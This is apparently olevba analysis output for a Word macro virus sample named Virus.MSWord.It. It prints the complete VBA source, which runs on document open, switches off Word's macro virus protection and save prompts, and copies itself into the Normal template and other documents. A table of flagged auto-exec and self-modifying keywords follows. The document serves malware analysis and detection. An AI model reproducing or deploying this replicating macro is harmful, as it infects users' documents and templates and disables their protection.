olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.It-7e779314f6125e2240e49dabf053a291a34bfe10
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.It-7e779314f6125e2240e49dabf053a291a34bfe10 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): IT
End Sub
Private Function IT()
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Set TargetModule = Target.VBProject.VBComponents.Item(1).CodeModule
If TargetModule.CountOfLines = 0 Then TargetModule.AddFromString "Private Sub Document_Open()" & vbCrLf & "End Sub"
For X = 1 To TargetModule.CountOfLines
If TargetModule.Lines(X, 1) = "Private Function IT()" Then GoTo Quit
Next
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
For X = 1 To Host.CountOfLines
If Host.Lines(X, 1) = "Private Function IT()" Then GoTo Continue
Next
Continue:
TD = Host.Lines(X, 24)
For X = 1 To TargetModule.CountOfLines
If Left(TargetModule.Lines(X, 1), 4) = "Sub " Then TargetModule.ReplaceLine X, TargetModule.Lines(X, 1) & ": IT"
If Left(TargetModule.Lines(X, 1), 12) = "Private Sub " Then TargetModule.ReplaceLine X, TargetModule.Lines(X, 1) & ": IT"
Next
TargetModule.AddFromString TD
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Quit:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

